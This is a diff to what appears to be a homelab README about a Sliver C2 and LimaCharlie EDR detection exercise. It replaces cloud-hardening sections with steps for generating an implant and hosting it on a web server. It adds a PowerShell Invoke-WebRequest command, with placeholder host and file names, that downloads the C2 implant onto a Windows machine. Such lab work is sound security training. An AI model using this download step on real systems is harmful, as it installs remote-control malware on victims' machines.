@@ -17,24 +17,11 @@ The architecture of the project consists of the following components:
 - LimaCharlieEDR
 - Silver C2 Server
 
-## Architecture Before Hardening / Security Controls
-![Architecture Diagram](https://i.imgur.com/aBDwnKb.jpg)
+After environment is set up I created a implant on the Ubuntu server to install on to the Windows System
+![Implant](https://i.imgur.com/LEP0qSk.png)
 
-## Architecture After Hardening / Security Controls
-![Architecture Diagram](https://i.imgur.com/YQNa9Pp.jpg)
+Next I created quick websever on the Ubuntu machine for the C2 Payload to be installed from, then I ran this command on the Windows device.
+![IWR](https://i.imgur.com/dadsDeX.png)
 
+IWR -Uri http://[IpAddress]/[ImplantName] -Outfile [FileLocation]
 
-
-
-For the "BEFORE" metrics, all resources were originally deployed, exposed to the internet. The Virtual Machines had both their Network Security Groups and built-in firewalls wide open, and all other resources are deployed with public endpoints visible to the Internet; aka, no use for Private Endpoints.
-
-For the "AFTER" metrics, Network Security Groups were hardened by blocking ALL traffic with the exception of my admin workstation, and all other resources were protected by their built-in firewalls as well as Private Endpoint
-
-## Attack Maps Before Hardening / Security Controls
-![NSG Allowed Inbound Malicious Flows](https://i.imgur.com/1qvswSX.png)<br>
-![Linux Syslog Auth Failures](https://i.imgur.com/G1YgZt6.png)<br>
-![Windows RDP/SMB Auth Failures](https://i.imgur.com/ESr9Dlv.png)<br>
-
-## Metrics Before Hardening / Security Controls
-
-The following table shows the metrics we measured in our insecure environment for 24 hours:
